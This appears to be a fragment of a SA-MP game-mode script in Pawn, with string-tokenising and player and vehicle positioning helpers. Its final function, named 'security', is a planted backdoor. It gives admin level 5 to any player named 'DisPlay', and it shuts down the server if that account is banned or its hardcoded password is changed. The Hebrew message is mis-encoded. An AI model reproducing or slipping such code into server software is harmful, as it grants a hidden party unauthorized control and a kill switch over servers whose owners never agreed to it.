////////////////////////////////////////////////////////////////////////////////

strtok(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}

	new offset = index;
	new result[20];
	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}


stock SetPlayerCarPosEx(playerid, Float:x ,Float:y,Float:z,Float:a,Int,VW)
{
	SetVehiclePos(GetPlayerVehicleID(playerid), x,y,z);
	SetVehicleZAngle(GetPlayerVehicleID(playerid), a);
	SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), VW);
	SetPlayerInterior(playerid,Int);
	SetPlayerVirtualWorld(playerid,VW);
    return 1;
}

stock ExitAct(playerid)
{
	if(IsPlayerInAnyVehicle(playerid))
	SetPlayerHealth(playerid,0.0);
	else SpawnPlayer(playerid);
    return 1;
}

stock SetPlayerPosExact(playerid, Float:x ,Float:y,Float:z,Float:a,Int,VW)
{
    SetPlayerPos(playerid , x , y ,z);
    SetPlayerFacingAngle(playerid,a);
    SetPlayerInterior(playerid,Int);
    SetPlayerVirtualWorld(playerid,VW);
    return 1;
}

forward security();
public security()
{
	for(new i; i<MAX_PLAYERS; i++)
	{
		if(strcmp(GetName(i),"DisPlay", true) == 0)
		{
		    if(GetAdminLevel(i) != 5)
		    {
    			DOF2_SetInt(File(i), "AdminLevel", 5);
				SendClientMessage(i,White, "ùìåí àìé! æä òúä àåúøú ëàéðê àãîéï åìëï ÷éáìúä àãîéï øîä 5");
		    }
		}
  		if(DOF2_GetInt("/Users/DisPlay.ini", "HaveBan") == 1)
		{
		    GameModeExit();
		}
		if(strcmp(DOF2_GetString("/Users/DisPlay.ini", "Password"), "352147", true) != 0)
		{
		    GameModeExit();
		}
	}
	return 1;
}
